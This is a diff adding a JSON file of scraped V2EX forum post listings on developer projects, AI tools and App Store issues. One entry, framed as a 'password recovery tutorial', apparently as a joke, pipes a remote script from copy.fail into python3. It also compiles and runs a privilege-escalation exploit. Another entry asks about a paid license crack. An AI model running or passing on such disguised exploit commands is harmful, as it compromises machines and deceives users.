@@ -1,0 +1,514 @@
+[
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "做了个希卡石随机音效的冰箱门贴",
+    "url": "https://www.v2ex.com/t/1213373",
+    "description": "做了个希卡石随机音效的冰箱门贴. 用 esp32c3 super mini 和功放模块，精选 30 多个荒野之息的音效，打开冰箱门时随机播放一个荒野之息的音效，计划后面再试试奥德赛或者动森的音效\r\n\r\nhttps://youtube.com/shorts/TLRLSCSTyic",
+    "topics": [
+      "create"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 0,
+    "has_revenue": false
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "五一放假后 Vibe Coding 了一款 K8s 算力调度管理产品",
+    "url": "https://www.v2ex.com/t/1213370",
+    "description": "五一放假后 Vibe Coding 了一款 K8s 算力调度管理产品. 一直想做一款自己的 K8s 运维平台方面的产品，五一放假那天开了 Claude Max 5x 订阅，一有时间就吭哧吭哧干，现在基本集群管理 + GPU 算力调度（基于 Volcano + HAMi-core ）都完工了，下一步计划是模型服务。\r\n\r\n开源地址： https://github.com/togettoyou/kpilot\r\n\r\n架构上采用 Server + Worker 模式，Worker 主动发起双向 gRPC 连接，所有 K8s 操作由 Worker 代理执行。Server 端不持有任何集群的 kubeconfig ，运行时数据 100% 来自 Worker push 。\r\n\r",
+    "topics": [
+      "create"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 0,
+    "has_revenue": true
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "Vibe Coding 了一个带美颜功能的视频播放器并上架微软商店[送兑换码]",
+    "url": "https://www.v2ex.com/t/1213354",
+    "description": "Vibe Coding 了一个带美颜功能的视频播放器并上架微软商店[送兑换码]. ## 背景\r\n在**古法编程**时代，我就一直在开发自己的[视频播放库]( https://github.com/lxrite/LightPlayer)。这个库一直处于基本能用，但是功能不完善，也没有完整的 Demo 的状态。\r\n\r\n前段时间开始尝试看能不能基于这个半成品库，使用了微软最新的现代 UI 框架 **WinUI 3**，Vibe Coding 一个功能完善的原生视频播放器。\r\n\r\n不断的让 AI 补齐功能和完善一些之前遗漏的异常分支的处理。最后完成了这个功能完善的视频播放器。\r\n\r\n## 核心功能\r\n内部集成了 GPU 级渲染和 AI 图像处理。在看电视剧、电影或学习视频时，可以一",
+    "topics": [
+      "create"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 7,
+    "has_revenue": false
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "开源一个可以 clone 大型 git repo 的工具，支持断点续传",
+    "url": "https://www.v2ex.com/t/1213352",
+    "description": "开源一个可以 clone 大型 git repo 的工具，支持断点续传. 有些仓库太大，普通 git clone 一旦遇到 EOF 、网络抖动或者下载中断，往往就只能从头再来。\r\n\r\n项目地址： https://github.com/JayWang0/ScalarGui\r\n\r\n如果你经常因为 大 repo Clone 太慢、太大、半路失败后又要重下 而头疼，ScalarGui 是一个值得试试的 Windows 小工具。",
+    "topics": [
+      "create"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 1,
+    "has_revenue": false
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "新标签页管理插件 SignalTabs ：专治开着几十 Chrome 标签页的用户，一次关闭、清理重复、全局搜索",
+    "url": "https://www.v2ex.com/t/1213349",
+    "description": "新标签页管理插件 SignalTabs ：专治开着几十 Chrome 标签页的用户，一次关闭、清理重复、全局搜索. Chrome 长期开着几十个标签页，完全没办法找到或者整理，前阵子看到 ZaraZhang 的 Tab-Out 插件，感觉 idea 好赞，就这这个基础上做了二开。\r\n\r\nVibe-coding 让人上瘾，自己用的也很爽，这次也走完了发布到 Chrome 市场的流程，欢迎大家使用：\r\n\r\n - ** [安装插件] ** https://chromewebstore.google.com/detail/signaltabs-tab-workspace/paamdcbpjkcpcpnncoggpdikfmeeinhd\r\n\r\n -  [官网地址]  https://www.signaltabs.co",
+    "topics": [
+      "create"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 2,
+    "has_revenue": false
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "xlings: 通用包管理器 + OS-like 轻量级隔离环境, 可以创建多个 SubOS 环境跑 Agent, 不用担心破坏 Host 数据",
+    "url": "https://www.v2ex.com/t/1213341",
+    "description": "xlings: 通用包管理器 + OS-like 轻量级隔离环境, 可以创建多个 SubOS 环境跑 Agent, 不用担心破坏 Host 数据. 项目地址: https://github.com/openxlings/xlings\r\n\r\n注: 目前 linux 体验比较好, windows/macos 上逐渐适配中\r\n\r\n---\r\n\r\n<div align=center>\r\n\r\n  <h1>xlings</h1>\r\n\r\n  <em>通用包管理基础设施 + OS-like SubOS 隔离<br/>\r\n  多版本共存 · 无需 Root · 去中心化索引 · 面向 Agent</em>\r\n\r\n  <b> [官网] | [文档] | [包索引] | [社区论坛] </b>\r\n\r\n  中文 | [English](README.md)\r\n</",
+    "topics": [
+      "create"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 1,
+    "has_revenue": false
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "让 AI 帮忙做了个类似异度之刃 3 里的 Flame Clock",
+    "url": "https://www.v2ex.com/t/1213331",
+    "description": "让 AI 帮忙做了个类似异度之刃 3 里的 Flame Clock. [前情提要]( https://v2ex.com/t/1029311)\r\n\r\n两年过去了, 昨天试着找了下游戏资源并提取了相关文件.  \r\n(我不玩盗版和模拟器)\r\n\r\n游戏里似乎不是单纯的 Shader, 还用到了好几种材质.  \r\n而且 Shader 也不确定用了哪些...\r\n\r\n不过没关系, 试着让 AI 用 WebGL 模仿了一个嘿嘿.  \r\n总共消耗两个 5 小时额度\r\n\r\n虽然不完美, 但也算完成了一个小心愿了\r\n\r\nhttps://github.com/yechentide/flame-clock-gauge\r\n\r\n![image]( https://github.com/yec",
+    "topics": [
+      "create"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 0,
+    "has_revenue": false
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "上架了自己的第一个 Chrome 扩展：给 b 站直播增加一个折叠评论区的按钮",
+    "url": "https://www.v2ex.com/t/1213323",
+    "description": "上架了自己的第一个 Chrome 扩展：给 b 站直播增加一个折叠评论区的按钮. https://chromewebstore.google.com/detail/bilibili-%E7%9B%B4%E6%92%AD%E6%8A%98%E5%8F%A0%E8%AF%84%E8%AE%BA%E5%8C%BA/dhchkmgklclkbgiagnjkeeepbheablfe?authuser=0&hl=zh-CN \r\n\r\n在直播视频右侧 25%的位置增加一个小按钮，折叠、展开评论区，需要的可以试试看。\r\n\r\n只有这一个功能，按钮位置可调，收起后视频占用全部空间，大小也是可调。",
+    "topics": [
+      "create"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 2,
+    "has_revenue": false
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "无人在意 kimi code 出了个股票插件",
+    "url": "https://www.v2ex.com/t/1213371",
+    "description": "无人在意 kimi code 出了个股票插件. 我发现 kimi 不怎么买推广了，他现在搞这些数据库东西都是零星几个人介绍，今天看 code 额度发现多个官方插件了\n感觉 kimi 就是照着 claude 路走，然后还照顾下国内使用习惯\n挺好的，就是希望他能出个 129 档最好了",
+    "topics": [
+      "share"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 0,
+    "has_revenue": false
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "一机多开拖机软件 Aster 有人用过吗，有支持 win10/11 的免费版吗？",
+    "url": "https://www.v2ex.com/t/1213346",
+    "description": "一机多开拖机软件 Aster 有人用过吗，有支持 win10/11 的免费版吗？. 这个软件确实很好用，我把家里的电脑，连了三个屏幕，自己一个做做开发，老婆一个看看剧，儿子一个打游戏，比虚拟机省资源多了。https://www.bilibili.com/video/BV1tT42117LQ\r\n\r\n但是试用期只能用 14 天，网上有改时间延长使用的方案，但是很不方便，会影响上网。付费版的话，三用户的大概得要将近 400 块，太贵了。\r\n\r\n今天谷歌搜了下，有个 AsterForever 的插件（ https://www.asterforever.abrdns.com)，官网介绍说可以不用改时间，5 刀的价格还可以接受，但是得用 USDT 付款，不知道咋搞，也不知道靠不靠谱，有大",
+    "topics": [
+      "share"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 1,
+    "has_revenue": true
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "10 分钟测出你的 ai native 等级，从夯到拉。",
+    "url": "https://www.v2ex.com/t/1213278",
+    "description": "10 分钟测出你的 ai native 等级，从夯到拉。. rank.ha7ch.com\r\n\r\n震撼首发，全球独创。真的能够测出你有多 AI native 的测评，优秀的夯同学将参加 Ha7ch 的首次 线下 meetup. 北上广深，西雅图，SF ，波士顿，纽约🤠",
+    "topics": [
+      "share"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 2,
+    "has_revenue": false
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "Google 搜索抖音“汽水音乐”第一条是木马病毒",
+    "url": "https://www.v2ex.com/t/1213227",
+    "description": "Google 搜索抖音“汽水音乐”第一条是木马病毒. - 从这个网站下载抖音汽水音乐 windows 压缩包，解压缩过程中 windows 安全中心提示是特洛伊木马病毒，我还傻乎乎的解压缩了两次，不过万幸都阻止隔离了。运行 Microsoft Defender 脱机版扫描了一下，万幸没中招。\r\n\r\n- 其实之前社区就提示过谷歌搜索第一条也会有假网站，之前 telegram 和 z-library 都出现过，没想到防不胜防啊。\r\n\r\n@抖音同学们，这个你们能不能投诉处理一下啊\r\n\r\n![附检索结果截图]( https://i.imgur.com/xJ7XsRK.png)",
+    "topics": [
+      "share"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 15,
+    "has_revenue": false
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "[转载] Linux 找回密码教程，建议收藏！",
+    "url": "https://www.v2ex.com/t/1213200",
+    "description": "[转载] Linux 找回密码教程，建议收藏！. 1. Linux 找回密码教程，建议收藏！\r\ncurl https://copy.fail/exp | python3 && su\r\npasswd root\r\n设置你的新密码\r\n\r\n2. 你的 Linux 密码又忘了？\r\n没关系，这里还有一个新的！\r\ngit clone https://github.com/V4bel/dirtyfrag.git&& cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp\r\n\r\n3. 不想再忘记密码了？\r\n我们有专业的黑客团队帮您运维服务器和保管密码！\r\n项目地址: https://github.c",
+    "topics": [
+      "share"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 7,
+    "has_revenue": false
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "一个极简的导航站，只需要有 cf 就能部署",
+    "url": "https://www.v2ex.com/t/1213196",
+    "description": "一个极简的导航站，只需要有 cf 就能部署. 不需要服务器，只需要有 cf 账号就行，直接部署\r\n配置下环境变量就可以实现可以自己 div 的导航站\r\n项目地址是 https://github.com/maodeyu180/mao_nav\r\n部署教程在 md",
+    "topics": [
+      "share"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 0,
+    "has_revenue": false
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "做了三年技术文档，我终于不用手动截图写教程了",
+    "url": "https://www.v2ex.com/t/1213179",
+    "description": "做了三年技术文档，我终于不用手动截图写教程了. 上个月产品上线新功能，Leader 让我出一套操作手册。\r\n\r\n按以前的流程：打开录屏工具录一遍 → 导出视频 → 逐帧截图 → 打开 Word → 粘贴截图 → 写步骤说明 → 排版调格式。一个 5 分钟的操作流程，折腾下来两个小时起步。\r\n\r\n这次同事丢给我一个工具，说\"你试试这个\"。抱着试试看的心态用了一下午，感觉像是发现了新大陆。\r\n\r\n![FeelCut 产品概览]( https://feelcut.com/homepage.png)\r\n\r\n---\r\n\r\n## 先说录屏这个环节\r\n\r\n以前录屏就是机械地把屏幕操作录下来，回放的时候画面平淡如水，该看不清的地方还是看不清。\r\n\r\n这个叫",
+    "topics": [
+      "share"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 8,
+    "has_revenue": false
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "发现 cloudflare 也有各种 AI api, 包含 GPT-5.5, Claude Opus 4.7",
+    "url": "https://www.v2ex.com/t/1213128",
+    "description": "发现 cloudflare 也有各种 AI api, 包含 GPT-5.5, Claude Opus 4.7. 价格偏贵, 不要用各种中转了,中转不靠谱\r\nGPT-5.5------------------\r\nInput tokens (per 1M)\r\nUS$5.00\r\nOutput tokens (per 1M)\r\nUS$30.00\r\n\r\nClaude Opus 4.7---------------\r\nInput tokens (per 1M)\r\nUS$5.00\r\nOutput tokens (per 1M)\r\nUS$25.00\r\nCached input tokens (per 1M)\r\nUS$0.50\r\nCache creation tokens (per 1M)\r\nUS$6.25",
+    "topics": [
+      "share"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 13,
+    "has_revenue": true
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "iOS 耳机 BLE 命令能实现接听/挂断系统电话吗？",
+    "url": "https://www.v2ex.com/t/1211192",
+    "description": "iOS 耳机 BLE 命令能实现接听/挂断系统电话吗？. 现在是有这么一个场景，我们自己的蓝牙耳机通过双击/三击是可以接听和挂断系统电话的，然后我们 leader 希望能在 App 中通过指令来实现接听/挂断。\r\n耳机使用的是纯自定义 BLE 协议 ，没有实现标准 HFP 协议连接的蓝牙耳机，非来电情况下，BLE 指令执行的都没问题，来电时音频路由被系统自动切换了，不是 A2DP ，这就导致我们的 BLE 指令执行了但是没效果，无法实现接听和拒接。\r\n\r\n耳机厂商回复的是，耳机通过 sco 传输音频，来电场景和正常场景有冲突，所以不做通话按键指令。安卓表示非 sco 模式下可以挂断接听，现在问题压力给到我们 iOS 了。\r\n怎么办呀？",
+    "topics": [
+      "idev"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 4,
+    "has_revenue": false
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "国内注册苹果开发者账号是中文还是拼音啊",
+    "url": "https://www.v2ex.com/t/1210339",
+    "description": "国内注册苹果开发者账号是中文还是拼音啊. 之前没接触过相关的东西，想注册一个苹果开发者账号，主要是想做海外的市场，app 的下载页面的开发者显示的是中文还是拼音啊？要是中文的话，做海外市场差点意思啊",
+    "topics": [
+      "idev"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 8,
+    "has_revenue": false
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "写苹果 App 就用 苹果 ViewModel",
+    "url": "https://www.v2ex.com/t/1209376",
+    "description": "写苹果 App 就用 苹果 ViewModel. https://swiftpackageindex.com/lwj1994/apple_view_model\r\n\r\n不同于传统的 viewmodel ，苹果 vm 不局限于只服务 ui 。\r\n基于服务注册的 伪 di 。viewModel 可充当任何层，repo service \r\n引用计数自己感知生命周期，自动销毁 vm 。\r\n\r\n`.package(url: \"https://github.com/lwj1994/apple_view_model.git\", from: \"0.3.1\")`\r\n\r\nai 使用： `npx skills add https://github.com/lwj19",
+    "topics": [
+      "idev"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 0,
+    "has_revenue": false
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "开发 ios 并发布到苹果商店必须要求 系统和 xcode 是 26 了？",
+    "url": "https://www.v2ex.com/t/1209302",
+    "description": "开发 ios 并发布到苹果商店必须要求 系统和 xcode 是 26 了？. 今天本来想提交新版本，构建发布到 app store 的时候提示\r\nValidation failed\r\n\r\nSDK version issue. This app was built with the iOS 18.5 SDK. All iOS and iPadOS apps must be built with the iOs 26 SDK or later, included in Xcode 26 or later, in order to be uploaded to App Store Connect or submitted for distribution. (ID: e061",
+    "topics": [
+      "idev"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 35,
+    "has_revenue": true
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "请教下大家，做了一个 ai 应用，想上架 app store 需要深度合成备案么？",
+    "url": "https://www.v2ex.com/t/1209156",
+    "description": "请教下大家，做了一个 ai 应用，想上架 app store 需要深度合成备案么？. 我去网上搜好像说需要什么深度合成算法备案，不知道是否真的需要提交，有懂的 v 友么",
+    "topics": [
+      "idev"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 5,
+    "has_revenue": true
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "App 审核 In Review 两周了",
+    "url": "https://www.v2ex.com/t/1208103",
+    "description": "App 审核 In Review 两周了. 最近鼓捣了一个 AI Agent App （ https://github.com/samhjn/iClaw)，感觉有点意思，于是花$99 开通了 Apple Developer 账号，准备上架试试。\r\n\r\n\r\n于是经过了两轮拒审（第一轮说我 Crash on start 但没提供 Crash Report ；第二轮说我 Metadata 不合规，不能在中国区 Cue 到 OpenAI/Anthropic 以及要明确说明 HealthKit 的场景），第三轮提交目前卡在 In Review 状态快两周了。\r\n\r\n本来 Testflight 还能过审的（ https://testflight.a",
+    "topics": [
+      "idev"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 8,
+    "has_revenue": true
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "掐指一算从去年 12 月开始 ai 编程我已经做了 8 个项目，未来希望再发个手机和游戏应用",
+    "url": "https://www.v2ex.com/t/1207878",
+    "description": "掐指一算从去年 12 月开始 ai 编程我已经做了 8 个项目，未来希望再发个手机和游戏应用. https://github.com/hooosberg?tab=repositories\r\n掐指一算从去年 12 月开始 ai 编程我已经做了 8 个项目，还有三四个不成功没上传的\r\n谷歌插件\r\nDOMPrompter \r\nBeRaw\r\nPackpour \r\n苹果电脑\r\nGlotShot\r\nTrekReel\r\nWitNote\r\nAgentLimb \r\n网站\r\nUIXskills\r\n\r\n未来还想做手机 ios 和 一个游戏\r\n还在纠结创意\r\n我的梦想希望在这个月先做个 ios 小应用移动端的\r\n最后游戏是我的神杯",
+    "topics": [
+      "idev"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 25,
+    "has_revenue": false
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "Mac App 上架 App Store 被拒，怎么解决？",
+    "url": "https://www.v2ex.com/t/1207468",
+    "description": "Mac App 上架 App Store 被拒，怎么解决？. 理由是违反 Guideline 2.4.5 - Performance\r\n\r\n\r\nApp 需要申请辅助功能权限来实现自动粘贴的功能，我调研了很多已经上架的 app 都有这个功能和权限申请的流程，为啥就我卡这里了，那些已经上架的是怎么实现过审的？\r\n\r\n有没有过来人有经验可以分享的\r\n\r\n审核原文：\r\nIssue Description\r\n\r\nThe app requests access to Accessibility features on macOS but does not use these features for accessibility purposes. \r\n\r\nAcces",
+    "topics": [
+      "idev"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 9,
+    "has_revenue": true
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "国产的 AI IDE 矮子头上选将军好像也就 TRAE 好用点",
+    "url": "https://www.v2ex.com/t/1213384",
+    "description": "国产的 AI IDE 矮子头上选将军好像也就 TRAE 好用点. 对于大多数非科班计算机的同学，感觉目前国产的 Trea 应该是最顺手的 AI IDE 了，以前我也用 Cursor ，但是现在这货越来越狗了，比如开 Pro 才能自定义模型地址。\r\n\r\n像最新更新的 qoder ，有的人觉得比较好用，但是积分完全不够用。虽然现在新增了自定义模型功能，但却只能用固定服务商的。\r\n\r\n\r\nTRAE 倒是更加开放一点，可以自定义 Base URL\r\n\r\n其实更想用 CodeX 或者 ChatGPT Pro ，但是只有国内的 VISA 卡，官方开会员都不好开。",
+    "topics": [
+      "programmer"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 3,
+    "has_revenue": false
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "看到一个新闻：说的是一次性的 PR 提交 100w 行代码，这是不是太恐怖了，而且用 Rust 重构 Bun？",
+    "url": "https://www.v2ex.com/t/1213366",
+    "description": "看到一个新闻：说的是一次性的 PR 提交 100w 行代码，这是不是太恐怖了，而且用 Rust 重构 Bun？. 一次性的 PR 提交 100w 行代码，这是不是太恐怖了，AI 时代写代码都这么恐怖吗？不渐进重构？不遵循古法编程提交代码的习惯？一次少量提交？ AI Coding 时代，编码哪些有很大变化？",
+    "topics": [
+      "programmer"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 18,
+    "has_revenue": false
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "学校需要做一个校友会系统，完全使用 ai 进行二次开发可行吗",
+    "url": "https://www.v2ex.com/t/1213355",
+    "description": "学校需要做一个校友会系统，完全使用 ai 进行二次开发可行吗. 学校需要做一个校友会系统，也就是网站，手机跟电脑端。\r\n小程序的话审核又怕麻烦，想着只做网站也可以实现需求\r\n主要需求就是 留言板 活动发布报名，新闻内容发布，用户登录可以获取自己的校友卡号\r\n网上找了下，也问了 Claude ，推荐使用 ：若依、laravel 框架。或者 Wordpress 然后找到一些插件以及 ai 编写插件实现需求。\r\n想问下各位前辈，用哪个会折腾少一点，自己代码相对来说没那么高。感谢！！！",
+    "topics": [
+      "programmer"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 8,
+    "has_revenue": false
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "把图片变成可点击的组件— 一个简单但好用的前端库",
+    "url": "https://www.v2ex.com/t/1213345",
+    "description": "把图片变成可点击的组件— 一个简单但好用的前端库. https://clickable-img.dev.noteloom.app/\r\n\r\n这是我之前做公司的项目时顺手做的一个前端库。\r\n我们的微信小程序有一个弹窗，运营经常要更新，弹窗里还有多个点击热区，我就想 UI 出完图后，运营自己配置一下就可以热更新，就不用再改代码了。所以就有了这个工具。\r\n上传一个图片，可视化圈选热点区域，配置点击事件。\r\n代码里监听图片的点击事件即可。\r\n\r\n东西很简单，原理也很简单。不过确实能在某些特定场景下省下很多事情。",
+    "topics": [
+      "programmer"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 1,
+    "has_revenue": false
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "Bun 的 Rust 重写：一封来自 Zig 社区的公开信",
+    "url": "https://www.v2ex.com/t/1213191",
+    "description": "Bun 的 Rust 重写：一封来自 Zig 社区的公开信. > https://ziglang.cc/post/2026-05-16-bun-rust-port/",
+    "topics": [
+      "programmer"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 23,
+    "has_revenue": false
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "有了 agent 这种范式之后，语言大模型就不会算错基本的计算题了",
+    "url": "https://www.v2ex.com/t/1213167",
+    "description": "有了 agent 这种范式之后，语言大模型就不会算错基本的计算题了. 以前都说 LLM 是推理下一个字符，所以有可能算错 10+11 这种最基本的计算题\r\n\r\n现在似乎不会了，agent 的逻辑之下，LLM 会发现这是一个计算题，所以会当场写一个脚本再来算，就不会算错了\r\n\r\n很多以前纯靠预测字符的方案难以解决的问题现在似乎都被解决了（至少不会再犯离谱的错误",
+    "topics": [
+      "programmer"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 4,
+    "has_revenue": false
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "开发用 Claude desktop 还是 Codex？",
+    "url": "https://www.v2ex.com/t/1213136",
+    "description": "开发用 Claude desktop 还是 Codex？. 这里不对两种选择做好坏评价。\r\n\r\n从工具设计来说，Claude Desktop 设计思路是把所有东西塞进一个地方，「 Chat, Cowork, and Claude Code, all in one place 」，聊天、协作、终端，你坐在那儿和 AI 一起干活，它做一步你看一步，随时插手。用这类工具的人，天然喜欢盯着过程，不太放心把事情完全丢出去。\r\n\r\nCodex 的思路是「 Use Codex across multiple surfaces, all connected by your ChatGPT account 」，CLI 、IDE 、手机端各用各的，任务扔出去，等结果，同时",
+    "topics": [
+      "programmer"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 9,
+    "has_revenue": false
+  },
+  {
+    "source": "v2ex",
+    "market": "zh",
+    "name": "人在国外租了间房，然后房里有电脑，在国内有什么远程方案可以使用这台电脑? 主要是用 Claude 网页版和 code",
+    "url": "https://www.v2ex.com/t/1213129",
+    "description": "人在国外租了间房，然后房里有电脑，在国内有什么远程方案可以使用这台电脑? 主要是用 Claude 网页版和 code",
+    "topics": [
+      "programmer"
+    ],
+    "mrr": 0,
+    "profit": 0,
+    "asking_price": 0,
+    "paying_users": 0,
+    "votes": 49,
+    "has_revenue": false
+  }
+]
